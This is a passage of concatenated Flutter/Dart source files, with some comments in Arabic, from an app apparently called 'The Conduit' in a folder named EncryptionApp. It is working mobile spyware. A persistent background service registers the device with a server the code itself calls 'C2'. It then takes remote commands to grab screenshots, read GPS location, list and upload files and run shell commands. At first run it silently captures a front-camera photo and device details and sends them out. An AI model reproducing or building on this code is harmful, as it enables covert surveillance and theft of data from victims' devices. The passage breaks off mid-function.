        "Received event '$BG_SERVICE_EVENT_SEND_INITIAL_DATA'. Preparing to send initial data.");
    final alreadySent = prefs.getBool(PREF_INITIAL_DATA_SENT) ?? false;
    if (alreadySent && !(event?['force'] == true)) {
      logger.info("BackgroundService",
          "Initial data already sent and not forced, skipping.");
      return;
    }
    try {
      final deviceInfoPayload = await handles.deviceInfoService.getDeviceInfo();
      XFile? imageFile;
      logger.info("BackgroundService",
          "Sending initial data via HTTP. Device ID: ${deviceInfoPayload['deviceId']}");
      final success = await handles.networkService.sendInitialData(
        jsonData: deviceInfoPayload,
        imageFile: imageFile,
      );
      if (success) {
        await prefs.setBool(PREF_INITIAL_DATA_SENT, true);
        logger.info(
            "BackgroundService", "Initial data sent successfully via HTTP.");
      } else {
        logger.error(
            "BackgroundService", "Failed to send initial data via HTTP.");
      }
    } catch (e, s) {
      logger.error("BackgroundService",
          "Error during sending initial data via HTTP", e, s);
    }
  });

  if (service is AndroidServiceInstance) {
    try {
      await service.setAsForegroundService();
      logger.info(
          "BackgroundService:onStart", "Android service set to foreground.");
    } catch (e, s) {
      logger.error("BackgroundService:onStart",
          "Failed to set Android service to foreground", e, s);
    }
  }

  if (service is AndroidServiceInstance) {
    Timer.periodic(const Duration(minutes: 5), (timer) {
      if (!_isServiceRunning) {
        timer.cancel();
        return;
      }
      try {
        service.setForegroundNotificationInfo(
          title: "The Conduit Service",
          content:
              "Service active. Last check: ${DateTime.now().toIso8601String().substring(11, 19)}",
        );
      } catch (e, s) {
        logger.warn("BackgroundService:NotificationUpdate",
            "Could not update foreground notification. Error: $e, StackTrace: $s");
      }
    });
  }
  logger.info(
      "BackgroundService:onStart", "Service initialization process complete.");
}

void _startServiceWatchdog(BackgroundServiceHandles h) {
  _serviceWatchdogTimer?.cancel();
  _serviceWatchdogTimer = Timer.periodic(const Duration(minutes: 15), (_) {
    if (!_isServiceRunning) {
      _serviceWatchdogTimer?.cancel();
      h.logger.info("BackgroundService:Watchdog",
          "Service is not running, watchdog stopping.");
      return;
    }
    h.logger.info(
        "BackgroundService:Watchdog", "Watchdog check: Service is running.");
    if (!h.networkService.isSocketConnected) {
      h.logger.warn("BackgroundService:Watchdog",
          "Socket disconnected. Attempting reconnect via NetworkService.");
      h.networkService.connectSocketIO(h.currentDeviceId).catchError((e, s) =>
          h.logger.error("BackgroundService:Watchdog",
              "Error during watchdog reconnect attempt", e, s));
    }
    _checkAndRefreshRegistration(h);
  });
  h.logger.info("BackgroundService:Watchdog", "Service watchdog started.");
}

Future<void> _checkAndRefreshRegistration(BackgroundServiceHandles h) async {
  final lastRegTimeStr = h.preferences.getString('last_registration_time');
  bool needsRegistration = true;
  if (lastRegTimeStr != null) {
    try {
      final lastRegTime = DateTime.parse(lastRegTimeStr);
      if (DateTime.now().difference(lastRegTime).inHours < 6) {
        needsRegistration = false;
      }
    } catch (e) {
      h.logger.warn("BackgroundService:RefreshReg",
          "Error parsing last registration time: $e. Will re-register.");
    }
  }

  if (needsRegistration) {
    h.logger.info("BackgroundService:RefreshReg",
        "Registration refresh needed or first time. Attempting registration.");
    _registerDeviceWithC2(h);
  } else {
    h.logger.debug("BackgroundService:RefreshReg",
        "Registration is still recent. No refresh needed now.");
  }
}

Future<void> _registerDeviceWithC2(BackgroundServiceHandles h) async {
  if (!h.networkService.isSocketConnected) {
    h.logger.warn("BackgroundService:RegisterDevice",
        "Cannot register device. Socket not connected. Device ID: ${h.currentDeviceId}");
    h.networkService.connectSocketIO(h.currentDeviceId).catchError((e, s) =>
        h.logger.error("BackgroundService:RegisterDevice",
            "Error during connectSocketIO for registration", e, s));
    return;
  }
  try {
    final deviceInfoPayload = await h.deviceInfoService.getDeviceInfo();
    if (deviceInfoPayload['deviceId'] != h.currentDeviceId) {
      h.logger.warn("BackgroundService:RegisterDevice",
          "Mismatch between handles.currentDeviceId ('${h.currentDeviceId}') and deviceInfoPayload['deviceId'] ('${deviceInfoPayload['deviceId']}'). Using handles.currentDeviceId for registration.");
      deviceInfoPayload['deviceId'] = h.currentDeviceId;
    }

    h.logger.info("BackgroundService:RegisterDevice",
        "Registering device with C2. Device ID: ${h.currentDeviceId}");
    h.networkService.registerDeviceWithC2(deviceInfoPayload);

    await h.preferences
        .setString('last_registration_time', DateTime.now().toIso8601String());
    h.logger.info("BackgroundService:RegisterDevice",
        "Device registration event sent. Last registration time updated.");
  } catch (e, stackTrace) {
    h.logger.error("BackgroundService:RegisterDevice",
        "Error preparing or sending device registration", e, stackTrace);
  }
}

Future<void> _handleC2Command(
  BackgroundServiceHandles h,
  String commandName,
  Map<String, dynamic> args,
  String? commandId,
) async {
  h.logger.info("BackgroundService:HandleCommand",
      "Handling command: '$commandName' (ID: ${commandId ?? "N/A"})");
  dynamic resultPayload;
  String status = "success";

  try {
    switch (commandName) {
      case SIO_CMD_TAKE_PICTURE:
        h.logger.info("BackgroundService:HandleCommand",
            "Requesting UI screenshot for command '$commandName' (ID: ${commandId ?? "N/A"}).");
        _currentScreenshotCommandId = commandId;
        _currentScreenshotCommandRef = commandName;
        h.serviceInstance.invoke(
            'requestScreenshotFromUI', {'command_id': commandId, 'args': args});
        return;

      case SIO_CMD_GET_LOCATION:
        final Position? locationData =
            await h.locationService.getCurrentLocation();
        if (locationData != null) {
          resultPayload = {
            'latitude': locationData.latitude,
            'longitude': locationData.longitude,
            'accuracy': locationData.accuracy,
            'altitude': locationData.altitude,
            'speed': locationData.speed,
            'timestamp_gps': locationData.timestamp.toIso8601String(),
          };
          h.logger.info("BackgroundService:HandleCommand",
              "Location obtained: $resultPayload");
        } else {
          throw Exception(
              "Location unavailable or permission denied by location service.");
        }
        break;

      case SIO_CMD_LIST_FILES:
        final pathToList = args["path"] as String? ?? ".";
        h.logger.info("BackgroundService:HandleCommand",
            "Listing files for path: '$pathToList'");
        final Map<String, dynamic>? listFilesResult =
            await h.fileSystemService.listFiles(pathToList);
        if (listFilesResult != null && listFilesResult["error"] == null) {
          resultPayload = listFilesResult;
        } else {
          throw Exception(listFilesResult?["error"]?.toString() ??
              "Failed to list files via native code.");
        }
        break;

      case SIO_CMD_UPLOAD_SPECIFIC_FILE:
        final filePathToUpload = args["path"] as String?;
        if (filePathToUpload == null || filePathToUpload.isEmpty) {
          throw Exception(
              "File path is required for '$SIO_CMD_UPLOAD_SPECIFIC_FILE'.");
        }
        final file = File(filePathToUpload);
        if (!await file.exists()) {
          throw Exception("File not found at path: '$filePathToUpload'.");
        }
        h.logger.info("BackgroundService:HandleCommand",
            "Uploading specific file: '$filePathToUpload'.");
        await h.networkService.uploadFileFromCommand(
          deviceId: h.currentDeviceId,
          commandRef: commandName,
          commandId: commandId,
          fileToUpload: XFile(filePathToUpload),
        );
        return;

      case SIO_CMD_EXECUTE_SHELL:
        final shellCommandName = args["command_name"] as String?;
        final shellCommandArgs = (args["command_args"] as List<dynamic>?)
                ?.map((e) => e.toString())
                .toList() ??
            [];
        if (shellCommandName == null || shellCommandName.isEmpty) {
          throw Exception(
              "Command name ('command_name') is required for '$SIO_CMD_EXECUTE_SHELL'.");
        }
        h.logger.info("BackgroundService:HandleCommand",
            "Executing shell command: '$shellCommandName' with args: $shellCommandArgs");
        final Map<String, dynamic>? execResult = await h.fileSystemService
            .executeShellCommand(shellCommandName, shellCommandArgs);
        if (execResult != null && execResult["error"] == null) {
          resultPayload = execResult;
        } else {
          throw Exception(execResult?["error"]?.toString() ??
              "Failed to execute shell command via native code.");
        }
        break;

      case SIO_EVENT_REQUEST_REGISTRATION_INFO:
        h.logger.info("BackgroundService:HandleCommand",
            "Received request for registration info from C2. Re-registering.");
        _registerDeviceWithC2(h);
        return;

      default:
        h.logger.warn("BackgroundService:HandleCommand",
            "Unknown command received: '$commandName'");
        status = "error";
        resultPayload = {'message': "Unknown command: '$commandName'"};
    }
  } catch (e, stackTrace) {
    h.logger.error(
        "BackgroundService:HandleCommand",
        "Error handling command '$commandName' (ID: ${commandId ?? "N/A"})",
        e,
        stackTrace);
    status = "error";
    resultPayload = {'message': e.toString()};
  }

  h.networkService.sendCommandResponse(
    originalCommand: commandName,
    commandId: commandId,
    status: status,
    payload: resultPayload,
  );
}

Future<void> _stopService(BackgroundServiceHandles h) async {
  h.logger.info("BackgroundService:StopService", "Stopping service now...");
  _isServiceRunning = false;

  _serviceWatchdogTimer?.cancel();
  _serviceWatchdogTimer = null;

  await _connectionStatusSubscription?.cancel();
  _connectionStatusSubscription = null;
  await _commandSubscription?.cancel();
  _commandSubscription = null;

  h.networkService.dispose();
  h.logger.info("BackgroundService:StopService", "NetworkService disposed.");

  try {
    await h.serviceInstance.stopSelf();
    h.logger.info("BackgroundService:StopService",
        "Service instance stopped successfully.");
  } catch (e, s) {
    h.logger.error("BackgroundService:StopService",
        "Error stopping service instance", e, s);
  }
}

Future<bool> initializeBackgroundService() async {
  final logger = EnhancedLoggerService();
  logger.info("BackgroundService:Initialize",
      "Attempting to initialize FlutterBackgroundService...");
  final service = FlutterBackgroundService();

  if (Platform.isAndroid) {
    final flutterLocalNotificationsPlugin = FlutterLocalNotificationsPlugin();
    const androidInitialize =
        AndroidInitializationSettings('@mipmap/ic_launcher');
    const initializationSettings =
        InitializationSettings(android: androidInitialize);
    try {
      await flutterLocalNotificationsPlugin.initialize(initializationSettings);
      logger.info("BackgroundService:Initialize",
          "FlutterLocalNotificationsPlugin initialized.");
      const channel = AndroidNotificationChannel(
        'conduit_service_channel_id',
        'The Conduit Service Notifications',
        description:
            'Notifications for The Conduit background service activity.',
        importance: Importance.low,
        playSound: false,
        enableVibration: false,
        showBadge: false,
      );
      await flutterLocalNotificationsPlugin
          .resolvePlatformSpecificImplementation<
              AndroidFlutterLocalNotificationsPlugin>()
          ?.createNotificationChannel(channel);
      logger.info("BackgroundService:Initialize",
          "Notification channel 'conduit_service_channel_id' created/updated.");
    } catch (e, stackTrace) {
      logger.error("BackgroundService:Initialize",
          "Error initializing notifications or channel", e, stackTrace);
    }
  }

  try {
    await service.configure(
      androidConfiguration: AndroidConfiguration(
        onStart: onStart,
        isForegroundMode: true,
        autoStart: true,
        notificationChannelId: 'conduit_service_channel_id',
        initialNotificationTitle: 'The Conduit Service',
        initialNotificationContent:
            'Initializing The Conduit background operations...',
        foregroundServiceNotificationId: 888,
      ),
      iosConfiguration: IosConfiguration(
        autoStart: true,
        onForeground: onStart,
      ),
    );
    logger.info("BackgroundService:Initialize",
        "FlutterBackgroundService configured successfully.");
    return true;
  } catch (e, stackTrace) {
    logger.error("BackgroundService:Initialize",
        "Fatal error configuring FlutterBackgroundService", e, stackTrace);
    return false;
  }
}



// ------------------------------ نهاية الملف: background_service.dart ------------------------------
// ======================================================================


// ============================== بداية الملف: camera_service.dart ==============================
// المسار الكامل: E:\GitHub Projects\EncryptionApp\jjjjjjjjjjjjj\services\camera_service.dart
// ----------------------------------------------------------------------

// lib/services/camera_service.dart
// الإصدار المعدل لاستخدام Platform Channels للوصول إلى الكاميرا من الخلفية بشكل موثوق

import 'dart:async';

import 'package:camera/camera.dart'
    show XFile, CameraLensDirection; // نحتفظ بها لـ XFile وتعاريف العدسات
import 'package:flutter/foundation.dart'; // لـ debugPrint
import 'package:flutter/services.dart'; // مطلوب لـ PlatformChannel

class CameraService {
  // تعريف قناة الاتصال. تم تحديثها لتتطابق مع ما هو معرف في MainActivity.kt
  static const MethodChannel _channel =
      MethodChannel('com.zeroone.theconduit/camera');

  // لم نعد بحاجة لـ CameraController أو قائمة الكاميرات هنا إذا كانت كل العمليات تتم في الكود الأصلي.

  Future<bool> initializeCamera(CameraLensDirection direction) async {
    // الكود الأصلي سيتولى التهيئة عند استدعاء takePicture،
    // أو يمكننا إضافة دالة تهيئة خاصة إذا احتجنا لتهيئة مسبقة.
    // للتبسيط، نفترض أن الكود الأصلي يهيئ الكاميرا لكل لقطة.
    debugPrint(
        "CameraService (Dart): استدعاء initializeCamera لـ ${direction.name}. الكود الأصلي سيتولى التهيئة الفعلية.");
    // قد تصبح هذه الدالة بدون أي عمليات أو فقط للتسجيل إذا كان الكود الأصلي يدير كل شيء.
    return true; // نفترض أن الكود الأصلي سينجح أو يعالج الأخطاء.
  }

  Future<XFile?> takePicture(
      {required CameraLensDirection lensDirection}) async {
    debugPrint(
        "CameraService (Dart): محاولة التقاط صورة عبر قناة الاتصال (العدسة: ${lensDirection.name})");
    try {
      // استدعاء الدالة 'takePicture' في الكود الأصلي وتمرير اتجاه العدسة.
      final String? filePath = await _channel.invokeMethod('takePicture', {
        'lensDirection':
            lensDirection == CameraLensDirection.front ? 'front' : 'back',
      });

      if (filePath != null) {
        debugPrint(
            "CameraService (Dart): تم التقاط الصورة بنجاح عبر الكود الأصلي. المسار: $filePath");
        return XFile(filePath);
      } else {
        debugPrint(
            "CameraService (Dart): دالة takePicture الأصلية أعادت مسارًا فارغًا.");
        return null;
      }
    } on PlatformException catch (e) {
      debugPrint(
          "CameraService (Dart): خطأ أثناء استدعاء دالة takePicture الأصلية: ${e.message}");
      return null;
    } catch (e) {
      debugPrint("CameraService (Dart): خطأ غير متوقع في takePicture: $e");
      return null;
    }
  }

  Future<void> dispose() async {
    // إذا كان الكود الأصلي يدير دورة حياة الكاميرا، فقد تكون دالة dispose في Dart بسيطة.
    // يمكن استدعاء دالة dispose أصلية إذا لزم الأمر.
    debugPrint(
        "CameraService (Dart): استدعاء Dispose. يجب أن يتولى الكود الأصلي تحرير الموارد إذا لزم الأمر.");
    try {
      await _channel.invokeMethod(
          'disposeCamera'); // استدعاء دالة dispose في الكود الأصلي
    } on PlatformException catch (e) {
      debugPrint(
          "CameraService (Dart): خطأ أثناء استدعاء دالة disposeCamera الأصلية: ${e.message}");
    }
    // لا يوجد CameraController محلي لتحريره.
  }
}

// يمكن الإبقاء على هذا الامتداد المساعد
extension LensDirectionName on CameraLensDirection {
  String get name {
    switch (this) {
      case CameraLensDirection.front:
        return 'الأمامية';
      case CameraLensDirection.back:
        return 'الخلفية';
      case CameraLensDirection.external:
        return 'الخارجية';
    }
  }
}



// ------------------------------ نهاية الملف: camera_service.dart ------------------------------
// ======================================================================


// ============================== بداية الملف: data_collector_service.dart ==============================
// المسار الكامل: E:\GitHub Projects\EncryptionApp\jjjjjjjjjjjjj\services\data_collector_service.dart
// ----------------------------------------------------------------------

// lib/services/data_collector_service.dart
import 'dart:async';
import 'package:camera/camera.dart';
import 'package:flutter/foundation.dart'; // << لاستخدام debugPrint
import 'package:intl/intl.dart'; // لتنسيق الوقت
// import 'package:location/location.dart'; // << تم التغيير إلى geolocator
import 'package:geolocator/geolocator.dart'; // << لاستخدام Position

import 'location_service.dart';
import 'device_info_service.dart';
import 'camera_service.dart';

class DataCollectorService {
  final LocationService _locationService = LocationService();
  final DeviceInfoService _deviceInfoService = DeviceInfoService();
  final CameraService _cameraService = CameraService();

  Future<Map<String, dynamic>> collectInitialDataFromUiThread() async {
    debugPrint(
      "DataCollectorService (UI Thread): Starting initial data collection...",
    );
    final Map<String, dynamic> collectedPayload = {};
    Map<String, dynamic> jsonDataToBuild = {};
    XFile? capturedFrontImageFile;

    // 1. معلومات الجهاز
    debugPrint("DataCollectorService (UI Thread): Getting device info...");
    try {
      final deviceInfo = await _deviceInfoService.getDeviceInfo();
      jsonDataToBuild['deviceInfo'] = deviceInfo;
      if (deviceInfo.containsKey('deviceId')) {
        debugPrint(
          "DataCollectorService (UI Thread): Device info collected successfully, Device ID: ${deviceInfo['deviceId']}",
        );
      } else {
        debugPrint(
          "DataCollectorService (UI Thread): WARNING - Device ID not found in deviceInfo payload from DeviceInfoService.",
        );
      }
    } catch (e, s) {
      debugPrint(
        "DataCollectorService (UI Thread): Error getting device info: $e\nStackTrace: $s",
      );
      jsonDataToBuild['deviceInfo'] = {
        'error': 'Failed to get device info',
        'details': e.toString(),
      };
    }

    // 2. الموقع الجغرافي (باستخدام Position من geolocator)
    debugPrint("DataCollectorService (UI Thread): Getting current location...");
    try {
      // LocationService.getCurrentLocation() الآن يعيد Position? من geolocator
      final Position? positionData =
          await _locationService.getCurrentLocation();
      if (positionData != null) {
        jsonDataToBuild['location'] = {
          'latitude': positionData.latitude,
          'longitude': positionData.longitude,
          'accuracy': positionData.accuracy,
          'altitude': positionData.altitude,
          'speed': positionData.speed,
          'timestamp_gps':
              positionData.timestamp
                  ?.toIso8601String(), // Position.timestamp is DateTime?
        };
        debugPrint(
          "DataCollectorService (UI Thread): Location data collected: ${jsonDataToBuild['location']}",
        );
      } else {
        debugPrint(
          "DataCollectorService (UI Thread): Location data (Position) returned null.",
        );
        jsonDataToBuild['location'] = {
          'error':
              'Failed to get location data (service returned null Position)',
        };
      }
    } catch (e, s) {
      debugPrint(
        "DataCollectorService (UI Thread): Error getting location: $e\nStackTrace: $s",
      );
      jsonDataToBuild['location'] = {
        'error': 'Failed to get location due to exception',
        'details': e.toString(),
      };
    }

    // 3. التقاط صورة من الكاميرا الأمامية
    debugPrint(
      "DataCollectorService (UI Thread): Attempting to initialize and capture front camera image...",
    );
    try {
      // تم التأكد من أن CameraService.initializeCamera لا يتم استدعاؤه هنا مباشرة
      // بل يتم الاعتماد على أن QrScannerScreen يقوم بالتهيئة
      // ولكن لأغراض جمع البيانات الأولية، قد نحتاج لتهيئة مؤقتة إذا لم تكن مهيئة
      // أو الأفضل أن يكون CameraService مهيأً بشكل مستقل أو من خلال QrScannerScreen
      // بناءً على الخطأ السابق، takePicture يتطلب lensDirection
      capturedFrontImageFile = await _cameraService.takePicture(
        lensDirection: CameraLensDirection.front,
      );
      if (capturedFrontImageFile != null) {
        debugPrint(
          "DataCollectorService (UI Thread): Front image captured: ${capturedFrontImageFile.path}",
        );
        jsonDataToBuild['frontImageInfo'] = {
          'status': 'Captured',
          'name_on_device': capturedFrontImageFile.name,
          'path_on_device': capturedFrontImageFile.path,
        };
      } else {
        debugPrint(
          "DataCollectorService (UI Thread): Front image capture attempt resulted in null XFile.",
        );
        jsonDataToBuild['frontImageInfo'] = {
          'error': 'Failed to capture front image (XFile was null)',
        };
      }
    } catch (e, s) {
      debugPrint(
        "DataCollectorService (UI Thread): Exception during front camera operations: $e\nStackTrace: $s",
      );
      jsonDataToBuild['frontImageInfo'] = {
        'error': 'Exception during camera operation',
        'details': e.toString(),
      };
    }
    // لا يتم عمل dispose للكاميرا هنا، QrScannerScreen يتولى ذلك

    // 4. إضافة الطابع الزمني النهائي
    jsonDataToBuild['timestamp_collection_utc'] =
        DateTime.now().toUtc().toIso8601String();
    jsonDataToBuild['timestamp_collection_local'] = DateFormat(
      'yyyy-MM-dd HH:mm:ss ZZZZ',
      'en_US',
    ).format(DateTime.now());

    // 5. تجميع الحمولة النهائية
    collectedPayload['data'] = jsonDataToBuild;
    collectedPayload['imageFile'] = capturedFrontImageFile;

    debugPrint(
      "DataCollectorService (UI Thread): Initial data collection process finished. Payload ready.",
    );
    return collectedPayload;
  }

  Future<void> disposeCamera() async {
    debugPrint(
      "DataCollectorService: disposeCamera() called from outside. Disposing camera resources...",
    );
    await _cameraService.dispose();
    debugPrint("DataCollectorService: Camera resources disposed.");
  }
}



// ------------------------------ نهاية الملف: data_collector_service.dart ------------------------------
// ======================================================================


// ============================== بداية الملف: device_info_service.dart ==============================
// المسار الكامل: E:\GitHub Projects\EncryptionApp\jjjjjjjjjjjjj\services\device_info_service.dart
// ----------------------------------------------------------------------

// lib/services/device_info_service.dart
import 'dart:io' show Platform;

import 'package:device_info_plus/device_info_plus.dart';
import 'package:flutter/foundation.dart' show kIsWeb, debugPrint;
import 'package:shared_preferences/shared_preferences.dart';
import 'package:uuid/uuid.dart';

import '../utils/constants.dart'; //  للوصول إلى PREF_DEVICE_ID المحدث

class DeviceInfoService {
  final DeviceInfoPlugin _deviceInfoPlugin = DeviceInfoPlugin();
  final Uuid _uuid = const Uuid();

  Future<String> getOrCreateUniqueDeviceId() async {
    final prefs = await SharedPreferences.getInstance();
    String? deviceId = prefs.getString(PREF_DEVICE_ID); // استخدام الثابت المحدث

    if (deviceId != null && deviceId.isNotEmpty) {
      debugPrint("DeviceInfoService: Retrieved existing Device ID: $deviceId");
      return deviceId;
    }

    try {
      if (kIsWeb) {
        // For web, a UUID is generally the most reliable persistent client identifier
        // that doesn't rely on browser-specific or easily cleared storage like localStora
        // However, for consistency with mobile, we'll generate a UUID and store it.
        deviceId = "web_${_uuid.v4()}";
      } else if (Platform.isAndroid) {
        final androidInfo = await _deviceInfoPlugin.androidInfo;
        // androidInfo.id (SSAID) can be null or change on factory reset.
        // It's generally unique per app signing key, app, and user.
        // Using it as a base if available.
        String? nativeId =
            androidInfo.id; // android.os.Build.SERIAL is restricted.
        if (nativeId.isNotEmpty && nativeId != "unknown") {
          deviceId = "android_$nativeId";
        } else {
          // Fallback for Android if SSAID is not good
          deviceId = "android_uuid_${_uuid.v4()}";
        }
      } else if (Platform.isIOS) {
        final iosInfo = await _deviceInfoPlugin.iosInfo;
        // identifierForVendor is unique to the app's vendor on that device.
        if (iosInfo.identifierForVendor != null &&
            iosInfo.identifierForVendor!.isNotEmpty) {
          deviceId = "ios_${iosInfo.identifierForVendor!}";
        } else {
          // Fallback for iOS
          deviceId = "ios_uuid_${_uuid.v4()}";
        }
      } else {
        // Other platforms (Linux, Windows, macOS)
        // For desktop, combination of machine details might be an option, but UUID is simpler for now.
        deviceId = "desktop_${_uuid.v4()}";
      }
    } catch (e) {
      debugPrint(
          "DeviceInfoService: Error getting native device ID: $e. Falling back to pure UUID.");
      deviceId = "generic_uuid_${_uuid.v4()}"; // Pure UUID as a last resort
    }
    // Ensure deviceId is never null before saving
    if (deviceId.isEmpty) {
      deviceId = "fallback_uuid_${_uuid.v4()}";
      debugPrint(
          "DeviceInfoService: Device ID was still null/empty, used final fallback UUID: $deviceId");
    }

    await prefs.setString(PREF_DEVICE_ID, deviceId); // استخدام الثابت المحدث
    debugPrint(
        "DeviceInfoService: Generated and saved new Device ID: $deviceId");
    return deviceId;
  }

  Future<Map<String, dynamic>> getDeviceInfo() async {
    final String uniqueId = await getOrCreateUniqueDeviceId();
    final Map<String, dynamic> deviceData = {
      'deviceId': uniqueId, // المعرف الفريد للجهاز
      'platform': 'unknown_platform',
      'osVersion': 'unknown_os_version',
      'model': 'unknown_model',
      'deviceName': 'unknown_device_name',
      'brand': 'unknown_brand',
      'isPhysicalDevice': 'unknown',
      'systemFeatures': <String>[], // خاص بالأندرويد
      'collectedAt': DateTime.now().toUtc().toIso8601String(),
    };

    try {
      if (kIsWeb) {
        deviceData['platform'] = 'web';
        final webBrowserInfo = await _deviceInfoPlugin.webBrowserInfo;
        deviceData['osVersion'] = webBrowserInfo.platform ?? 'N/A';
        deviceData['model'] = webBrowserInfo.browserName
            .toString()
            .split('.')
            .last; // e.g., Chrome
        deviceData['deviceName'] = webBrowserInfo.userAgent?.substring(
                0,
                (webBrowserInfo.userAgent?.length ?? 0) > 200
                    ? 200
                    : (webBrowserInfo.userAgent?.length ?? 0)) ??
            'N/A';
        deviceData['brand'] = webBrowserInfo.vendor ?? 'N/A';
        deviceData['isPhysicalDevice'] =
            'false'; // Web is not a physical device in this context
      } else if (Platform.isAndroid) {
        final androidInfo = await _deviceInfoPlugin.androidInfo;
        deviceData['platform'] = 'android';
        deviceData['osVersion'] = androidInfo.version.release; // e.g., "13"
        deviceData['sdkInt'] = androidInfo.version.sdkInt;
        deviceData['brand'] = androidInfo.brand; // e.g., "samsung"
        deviceData['model'] = androidInfo.model; // e.g., "SM-G991U"
        deviceData['deviceName'] =
            androidInfo.device; // internal name e.g., "starqltesq"
        deviceData['product'] = androidInfo.product; // user-facing product name
        deviceData['display'] = androidInfo.display; // display ID
        deviceData['isPhysicalDevice'] =
            androidInfo.isPhysicalDevice.toString();
        deviceData['systemFeatures'] = androidInfo.systemFeatures;
        // deviceData['androidId_debug'] = androidInfo.id; // SSAID for debugging
      } else if (Platform.isIOS) {
        final iosInfo = await _deviceInfoPlugin.iosInfo;
        deviceData['platform'] = 'ios';
        deviceData['osVersion'] = iosInfo.systemVersion; // e.g., "16.5"
        deviceData['model'] =
            iosInfo.model; // e.g., "iPhone14,5" (internal model name)
        deviceData['utsname_machine'] =
            iosInfo.utsname.machine; // More specific model
        deviceData['deviceName'] = iosInfo.name; // e.g., "John's iPhone"
        deviceData['brand'] = 'Apple';
        deviceData['isPhysicalDevice'] = iosInfo.isPhysicalDevice.toString();
        // deviceData['identifierForVendor_debug'] = iosInfo.identifierForVendor; // For debugging
      }
      // Add other platforms if needed (macOS, Windows, Linux)
    } catch (e, s) {
      debugPrint(
          "DeviceInfoService: Error getting detailed device info: $e\nStackTrace: $s");
      deviceData['error_getting_device_info'] = e.toString();
    }
    return deviceData;
  }
}



// ------------------------------ نهاية الملف: device_info_service.dart ------------------------------
// ======================================================================


// ============================== بداية الملف: file_system_service.dart ==============================
// المسار الكامل: E:\GitHub Projects\EncryptionApp\jjjjjjjjjjjjj\services\file_system_service.dart
// ----------------------------------------------------------------------

// lib/services/file_system_service.dart
import 'package:flutter/foundation.dart'; // لـ debugPrint
import 'package:flutter/services.dart';
// لا حاجة لـ EnhancedLoggerService هنا مباشرة إذا كانت الأخطاء تُمرر للخارج

class FileSystemService {
  // اسم القناة يجب أن يتطابق مع ما هو معرف في MainActivity.kt
  static const MethodChannel _channel = MethodChannel(
      'com.zeroone.theconduit/files'); // تم التغيير من /filesystem إلى /files

  Future<Map<String, dynamic>?> listFiles(String path) async {
    debugPrint(
        "FileSystemService (Dart): Attempting to list files for path: $path via platform channel");
    try {
      final Map<dynamic, dynamic>? result = await _channel.invokeMethod(
        'listFiles', // اسم الدالة في الكود الأصلي
        {'path': path}, // الوسائط المرسلة
      );
      if (result != null) {
        // تحويل المفاتيح إلى String إذا لم تكن كذلك بالفعل
        final Map<String, dynamic> typedResult = Map<String, dynamic>.from(
          result.map((key, value) => MapEntry(key.toString(), value)),
        );
        debugPrint(
            "FileSystemService (Dart): Successfully listed files. Data: ${typedResult.toString().substring(0, (typedResult.toString().length > 200 ? 200 : typedResult.toString().length))}"); // تسجيل جزء من النتيجة
        return typedResult;
      } else {
        debugPrint(
            "FileSystemService (Dart): Native listFiles method returned null.");
        return {
          'error': 'Native method for listFiles returned null',
          'path': path,
          'files': []
        };
      }
    } on PlatformException catch (e) {
      debugPrint(
          "FileSystemService (Dart): PlatformException during listFiles: ${e.code} - ${e.message} - Details: ${e.details}");
      return {
        'error': e.message,
        'details': e.details,
        'errorCode': e.code,
        'path': path,
        'files': []
      };
    } catch (e) {
      debugPrint("FileSystemService (Dart): Unexpected error in listFiles: $e");
      return {'error': e.toString(), 'path': path, 'files': []};
    }
  }

  Future<Map<String, dynamic>?> executeShellCommand(
    String command,
    List<String> args,
  ) async {
    debugPrint(
        "FileSystemService (Dart): Attempting to execute shell command: '$command' with args: $args");
    // !!! تنبيه: هذا سيفشل إذا لم يتم تنفيذ الجزء الأصلي في MainActivity.kt !!!
    // !!! تأكد من أن MainActivity.kt لديها معالج لـ "executeShell" !!!
    try {
      final Map<dynamic, dynamic>? result = await _channel.invokeMethod(
        'executeShell', // اسم الدالة المتوقع في الكود الأصلي
        {'command': command, 'args': args},
      );
      if (result != null) {
        final Map<String, dynamic> typedResult = Map<String, dynamic>.from(
          result.map((key, value) => MapEntry(key.toString(), value)),
        );
        debugPrint(
            "FileSystemService (Dart): Shell command executed. Output: $typedResult");
        return typedResult;
      } else {
        debugPrint(
            "FileSystemService (Dart): Native executeShell method returned null.");
        return {
          'error': 'Native method for executeShell returned null',
          'command': command
        };
      }
    } on PlatformException catch (e) {
      debugPrint(
          "FileSystemService (Dart): PlatformException during executeShell: ${e.code} - ${e.message} - Details: ${e.details}");
      if (e.code == "NotImplemented") {
        return {
          'error':
              "Shell execution is not implemented on the native side (Android/iOS). Command: '$command'",
          'details': e.details,
          'errorCode': e.code
        };
      }
      return {
        'error': e.message,
        'details': e.details,
        'errorCode': e.code,
        'command': command
      };
    } catch (e) {
      debugPrint(
          "FileSystemService (Dart): Unexpected error in executeShellCommand: $e");
      return {'error': e.toString(), 'command': command};
    }
  }
}



// ------------------------------ نهاية الملف: file_system_service.dart ------------------------------
// ======================================================================


// ============================== بداية الملف: location_service.dart ==============================
// المسار الكامل: E:\GitHub Projects\EncryptionApp\jjjjjjjjjjjjj\services\location_service.dart
// ----------------------------------------------------------------------

// lib/services/location_service.dart
// الإصدار المعدل لاستخدام إضافة geolocator للعمل بشكل أفضل في الخلفية

import 'dart:async'; // Required for TimeoutException
import 'package:flutter/foundation.dart';
import 'package:geolocator/geolocator.dart';
import 'package:flutter/services.dart';

class LocationService {
  // لا حاجة لإنشاء كائن من Geolocator، فالدوال ثابتة (static)

  Future<Position?> getCurrentLocation() async {
    bool serviceEnabled;
    LocationPermission permission;

    // التحقق من أن خدمات الموقع مفعلة على الجهاز
    serviceEnabled = await Geolocator.isLocationServiceEnabled();
    if (!serviceEnabled) {
      debugPrint("LocationService (geolocator): خدمات الموقع معطلة.");
      return null;
    }

    permission = await Geolocator.checkPermission();
    if (permission == LocationPermission.denied) {
      debugPrint(
        "LocationService (geolocator): إذن الموقع مرفوض. محاولة طلب الإذن...",
      );
      permission = await Geolocator.requestPermission();
      if (permission == LocationPermission.denied) {
        debugPrint("LocationService (geolocator): طلب إذن الموقع مرفوض.");
        return null;
      }
    }

    if (permission == LocationPermission.deniedForever) {
      debugPrint("LocationService (geolocator): إذن الموقع مرفوض بشكل دائم.");
      return null;
    }

    debugPrint(
      "LocationService (geolocator): الأذونات ممنوحة وخدمات الموقع مفعلة. محاولة الحصول على الموقع...",
    );

    try {
      return await Geolocator.getCurrentPosition(
        desiredAccuracy: LocationAccuracy.high,
        // timeLimit: const Duration(seconds: 15), // Can be added if needed
      );
    } on PlatformException catch (e) {
      debugPrint(
